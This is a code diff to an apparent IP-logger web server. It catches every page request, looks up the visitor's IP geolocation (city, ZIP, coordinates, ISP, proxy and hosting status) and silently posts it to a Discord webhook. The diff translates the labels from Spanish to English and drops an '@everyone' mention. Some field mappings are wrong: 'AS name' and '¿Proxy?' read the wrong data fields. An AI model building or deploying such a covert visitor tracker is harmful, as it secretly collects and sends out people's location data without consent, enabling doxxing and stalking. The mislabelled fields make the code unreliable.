@@ -34,7 +34,7 @@ client.on('ready', () => {
   console.log(colors.blue('[DISCORD]') + ' Logged in as ' + colors.green(`${client.user?.tag ?? 'ERROR'}`));
 });
 
-client.login(process.env.DISC_TOKEN);
+client.login(process.env.DISC_TOKEN ?? 'ERROR');
 
 // Routes
 app.get('*', async (req: Request, res: Response): Promise<void> => {
@@ -53,33 +53,32 @@ app.get('*', async (req: Request, res: Response): Promise<void> => {
     const webhookClient = new Discord.WebhookClient({ url: `${process.env.WH_URL}` });
 
     const embed = new Discord.MessageEmbed()
-    .setTitle('Nueva entrada')
+    .setTitle('New entry')
     .addFields(
-      { name: 'IP', value: data.query || 'Sin datos', inline: true },
-      { name: 'Continente', value: data.continent || 'Sin datos', inline: true },
-      { name: 'Código del continente', value: data.continentCode || 'Sin datos', inline: true },
-      { name: 'País', value: data.country || 'Sin datos', inline: true },
-      { name: 'Código del país', value: data.countryCode || 'Sin datos', inline: true },
-      { name: 'Provincia/Estado', value: data.regionName || 'Sin datos', inline: true },
-      { name: 'Código de región', value: data.region || 'Sin datos', inline: true },
-      { name: 'Ciudad', value: data.city || 'Sin datos', inline: true },
-      { name: 'ZIP', value: data.zip || 'Sin datos', inline: true },
-      { name: 'Latitud', value: `${data.lat || 'Sin datos'}`, inline: true },
-      { name: 'Longitud', value: `${data.lon || 'Sin datos'}`, inline: true },
-      { name: 'Zona horaria', value: data.timezone || 'Sin datos', inline: true },
-      { name: 'Moneda', value: data.currency || 'Sin datos', inline: true },
-      { name: 'ISP', value: data.isp || 'Sin datos', inline: true },
-      { name: 'Organización', value: data.org || 'Sin datos', inline: true },
-      { name: 'AS', value: data.as || 'Sin datos', inline: true },
-      { name: 'Nombre AS', value: data.asname || 'Sin datos', inline: true },
-      { name: 'Reversa', value: data.reverse || 'Sin datos', inline: true },
-      { name: '¿Movíl?', value: `${data.mobile || 'Sin datos'}`, inline: true },
-      { name: '¿Proxy?', value: `${data.mobile || 'Sin datos'}`, inline: true },
-      { name: '¿Hosting?', value: `${data.hosting || 'Sin datos'}`, inline: true }
+      { name: 'IP', value: data.query || 'No data', inline: true },
+      { name: 'Continent', value: data.continent || 'No data', inline: true },
+      { name: 'Continent code', value: data.continentCode || 'No data', inline: true },
+      { name: 'Country', value: data.country || 'No data', inline: true },
+      { name: 'Country code', value: data.countryCode || 'No data', inline: true },
+      { name: 'State/Province', value: data.regionName || 'No data', inline: true },
+      { name: 'State/Province code', value: data.region || 'No data', inline: true },
+      { name: 'City', value: data.city || 'No data', inline: true },
+      { name: 'ZIP', value: data.zip || 'No data', inline: true },
+      { name: 'Latitude', value: `${data.lat || 'No data'}`, inline: true },
+      { name: 'Longitude', value: `${data.lon || 'No data'}`, inline: true },
+      { name: 'Time zone', value: data.timezone || 'No data', inline: true },
+      { name: 'Currency', value: data.currency || 'No data', inline: true },
+      { name: 'ISP', value: data.isp || 'No data', inline: true },
+      { name: 'Organization', value: data.org || 'No data', inline: true },
+      { name: 'AS', value: data.as || 'No data', inline: true },
+      { name: 'AS name', value: data.reverse || 'No data', inline: true },
+      { name: '¿Mobile?', value: `${data.mobile || 'No data'}`, inline: true },
+      { name: '¿Proxy?', value: `${data.mobile || 'No data'}`, inline: true },
+      { name: '¿Hosting?', value: `${data.hosting || 'No data'}`, inline: true }
     )
     .setColor('#ff1616')
     
-    webhookClient.send({ content: '@everyone', embeds: [embed] });
+    webhookClient.send({ embeds: [embed] });
   }
 });
 
